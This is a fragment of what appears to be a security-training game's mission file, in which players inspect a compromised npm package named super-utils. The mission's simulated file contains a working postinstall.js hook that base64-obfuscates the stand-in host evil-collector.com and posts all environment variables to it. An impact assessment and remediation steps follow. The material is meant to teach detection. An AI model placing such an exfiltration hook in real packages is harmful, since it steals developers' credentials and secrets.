    'postinstall_code.txt': 'FILE: scripts/postinstall.js\n\n// Looks innocent at first glance...\nconst https = require("https");\nconst os = require("os");\n\n// Obfuscated variable names\nconst _0x = Buffer.from("aHR0cHM6Ly9ldmlsLWNvbGxlY3Rvci5jb20vZGF0YQ==", "base64").toString();\n\n// Collects ALL environment variables (contains secrets!)\nconst d = {\n  h: os.hostname(),\n  u: os.userInfo().username,\n  e: process.env, // ⚠️ THIS SENDS ALL ENV VARS\n  p: process.cwd(),\n  n: require("./package.json").name\n};\n\n// Sends to attacker\'s server\nhttps.request(_0x, {method:"POST",headers:{"Content-Type":"application/json"}}, ()=>{}).end(JSON.stringify(d));\n\n// The base64 decodes to: https://evil-collector.com/data\n// This steals: API keys, database passwords, AWS credentials,\n// Docker secrets, CI/CD tokens — anything in env vars!',
    'impact_assessment.txt': 'IMPACT ASSESSMENT:\n\n2.4M weekly downloads × 3 days = ~1M installations affected\n\nPotentially stolen:\n  - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY\n  - DATABASE_URL (with credentials)\n  - GITHUB_TOKEN\n  - STRIPE_SECRET_KEY\n  - JWT_SECRET\n  - Any CI/CD secrets\n\nAffected companies: Estimated 50,000+\nSeverity: CRITICAL\n\nRemediation:\n  1. npm unpublish super-utils@2.4.1\n  2. Rotate ALL secrets in affected environments\n  3. Audit CI/CD pipelines\n  4. Add package integrity checks'
  }},
  '/supply_chain',
  ["Start with the package info to understand the scope of the compromise.", "Check the diff summary — a new file was added. That's unusual for a patch release.", "The postinstall.js file contains the backdoor. It steals environment variables."],
  ['foundBackdoor', 'assessedImpact'],
  (p) => p.foundBackdoor && p.assessedImpact,
  [
    { command: 'cat', args: ['postinstall_code.txt'], progressUpdate: { foundBackdoor: true }, narrative: '💉 BACKDOOR FOUND! postinstall.js sends ALL environment variables (API keys, passwords, tokens) to evil-collector.com on every npm install!' },
    { command: 'cat', args: ['impact_assessment.txt'], progressUpdate: { assessedImpact: true }, narrative: '🌍 ~1 MILLION installations affected over 3 days. 50,000+ companies need to rotate all their secrets immediately!' }
  ]
);

export const chapter2Missions = [mission16, mission17, mission18, mission19, mission20, mission21, mission22, mission23, mission24, mission25];
